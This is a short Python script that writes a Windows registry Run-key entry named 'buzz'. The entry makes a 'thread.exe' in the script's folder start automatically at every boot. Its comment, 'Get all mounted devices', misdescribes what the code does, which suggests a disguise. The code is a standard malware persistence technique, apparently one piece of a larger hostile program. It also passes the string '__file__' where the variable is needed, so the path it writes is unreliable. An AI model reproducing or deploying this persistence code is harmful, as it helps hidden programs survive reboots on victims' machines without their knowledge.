import winreg, os

# Get all mounted devices (connected or not)
def boot():
    reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    key = winreg.CreateKey(reg, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run')
    current_dir = os.path.dirname(os.path.realpath('__file__')) + '\\' + 'thread.exe'
    winreg.SetValueEx(key, 'buzz', 0, winreg.REG_SZ, current_dir)
    winreg.CloseKey(reg)

if __name__ == '__main__':
    boot()